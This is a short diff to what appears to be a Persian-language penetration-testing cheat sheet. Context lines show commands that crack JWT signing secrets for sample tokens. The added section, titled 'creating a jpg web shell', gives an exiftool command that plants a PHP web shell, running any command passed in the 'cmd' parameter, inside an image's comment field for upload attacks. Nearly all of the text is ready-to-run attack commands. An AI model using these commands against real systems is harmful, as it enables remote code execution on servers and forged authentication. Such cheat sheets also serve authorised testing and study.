@@ -328,3 +328,9 @@ jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibm
 
 ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoicm9vdCIsInBlcm1pc3Npb25zIjpbInVzZXI6cmVhZCIsInVzZXI6d3JpdGUiXSwiaWF0IjoxNTkxMTcxODU4LCJleHAiOjE1OTEzNDQ2NTgsImlzcyI6Imh0dHBzOi8vZ2l0aHViLmNvbS9zbm9vcHlzZWN1cml0eSJ9.blfmt8RiLnBO8mfOKS1Y8u_aFZnMpgNhpQzooLADHcs
 ```
+
+## ایجاد وب شل jpg
+
+```text
+exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' meme.jpg
+```
